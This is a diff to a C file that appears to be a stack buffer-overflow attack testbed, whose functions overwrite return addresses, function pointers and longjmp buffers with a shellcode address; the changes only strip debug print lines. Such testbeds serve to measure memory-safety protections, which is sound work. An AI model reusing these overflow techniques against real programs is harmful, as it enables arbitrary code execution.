@@ -67,7 +67,7 @@ void parameter_func_pointer(int choice, void (*stack_function_pointer)()) {
 
       if((long)&stack_function_pointer < (long)&stack_buffer)
       {
-	  printf("Ben Sanity Check: this should never happen\n");
+	  printf("Ben Sanity Check: this should never happen, if it does the compiler did something strange. \n");
 	  printf("&stack_func_pointer=%x, &stack_buffer=%x\n",&stack_function_pointer, &stack_buffer);
 	  //return;
       }
@@ -97,26 +97,17 @@ void parameter_func_pointer(int choice, void (*stack_function_pointer)()) {
 
     overflow = (int)((long)&stack_pointer - (long)&stack_buffer) + 4;
     overflow_buffer[0] = (long)&shellcode;
-    printf("Ben Check: memset val=%d\n",overflow-8);
     memset(overflow_buffer+1, 'A', overflow-8);
     overflow_buffer[overflow/4-1] = (long)(&stack_function_pointer);
-
-    printf("Ben Check: memcpy val=%d\n",overflow);
     /* Then overflow stack_buffer with overflow_buffer */
     memcpy(stack_buffer, overflow_buffer, overflow);
-
-    printf("Ben Check: post memcpy\n");
 
     /* Overwritten data from stack_buffer is copied to where
        the stack_pointer is pointing */
     *stack_pointer = stack_buffer[0];
 
-    printf("Ben Check: post pointer corruption\n");
-
     /* Function call using the function pointer */
     (void)(*stack_function_pointer)();
-
-    printf("Ben Check: post malicious function call\n");
   }
   return;
 }
@@ -164,19 +155,14 @@ void parameter_longjmp_buf(int choice, jmp_buf stack_jmp_buffer) {
     overflow = (int)((long)&stack_pointer - (long)&stack_buffer) + 4;
     overflow_buffer[0] = (long)&shellcode;
 
-    printf("Ben Check: memset with val=%d\n",overflow-8);
     memset(overflow_buffer+1, 'A', overflow-8);
     overflow_buffer[overflow/4-1] = (long)&stack_jmp_buffer[0].__jmpbuf[5];
-
-    printf("Ben Check: memcpy with val=%d\n",overflow);
     /* Then overflow stack_buffer with overflow_buffer */
     memcpy(stack_buffer, overflow_buffer, overflow);
 
-    printf("Ben Check: post memcpy\n");
     /* Overwritten data from stack_buffer is copied to where
        the stack_pointer is pointing */
     *stack_pointer = stack_buffer[0];
-    printf("Ben Check: post pointer corruption\n");
   }
 
   else printf("Attack form not possible\n");
@@ -212,17 +198,12 @@ void vuln_stack_return_addr(int choice) { /* Attack forms 1(a) and 3(a) */
 
      
     overflow = (int)((long)&choice - (long)&stack_buffer);
-    printf("Ben note: memset with val=%d\n", overflow-4);
     fflush(stdout);
     memset(overflow_buffer, 'A', overflow-4);
     overflow_buffer[overflow/4-1] = (long)&shellcode;
 
     /* Then overflow stack_buffer with overflow_buffer */
-    printf("Ben note: memcpy with val=%d\n", overflow);
-    fflush(stdout);
     memcpy(stack_buffer, overflow_buffer, overflow); 
-    printf("Ben note: post memcpy\n");
-    fflush(stdout);
   }
   else if ((choice == 7) && ((long)&stack_pointer >  (long)&stack_buffer)) {
       //  ((long)&stack_pointer > (long)&propolice_dummy)) {
@@ -232,12 +213,8 @@ void vuln_stack_return_addr(int choice) { /* Attack forms 1(a) and 3(a) */
     overflow = (int)((long)&stack_pointer - (long)&stack_buffer) + 4;
     overflow_buffer[0] = (long)&shellcode;
 
-    printf("Ben note: overflow val=%d\n",overflow);
-
     memset(overflow_buffer+1, 'A', overflow-8);
     overflow_buffer[overflow/4-1] = (long)(&choice-1);
-
-    printf("Ben note: overflow val=%d\n",overflow);
     /* Then overflow stack_buffer with overflow_buffer */
     memcpy(stack_buffer, overflow_buffer, overflow);
 
@@ -339,11 +316,9 @@ void vuln_stack_function_ptr(int choice) { /* Attack forms 1(c) and 3(c) */
        shellcode, a few 'A's and a pointer to the function pointer */
     overflow = (int)((long)&stack_pointer - (long)&stack_buffer) + 4;
     overflow_buffer[0] = (long)&shellcode;
-    printf("Ben note: memset with val=%d\n",overflow-8);
     memset(overflow_buffer+1, 'A', overflow-8);
     overflow_buffer[overflow/4-1] = (long)(&stack_function_pointer);
 
-    printf("Ben note: memcpy with val=%d\n",overflow);
     /* Then overflow stack_buffer with overflow_buffer */
     memcpy(stack_buffer, overflow_buffer, overflow);
 
@@ -397,19 +372,15 @@ void vuln_stack_longjmp_buf(int choice) { /* Attack forms 1(d) and 3(d) */
 
     overflow = (int)((long)&stack_pointer - (long)&stack_buffer) + 4;
     overflow_buffer[0] = (long)&shellcode;
-    printf("Ben note: memset with val=%d\n",overflow);
     memset(overflow_buffer+1, 'A', overflow-8);
     overflow_buffer[overflow/4-1] = (long)&stack_jmp_buffer[0].__jmpbuf[5];
 
-    printf("Ben note: memcpy with val=%d\n",overflow);
     /* Then overflow stack_buffer with overflow_buffer */
     memcpy(stack_buffer, overflow_buffer, overflow);
 
-    printf("Ben note: post memcpy\n");
     /* Overwritten data from stack_buffer is copied to where
        the stack_pointer is pointing */
     *stack_pointer = stack_buffer[0];
-    printf("Ben note: post pointer corruption\n");
   }
 
   else printf("Attack form not possible\n");
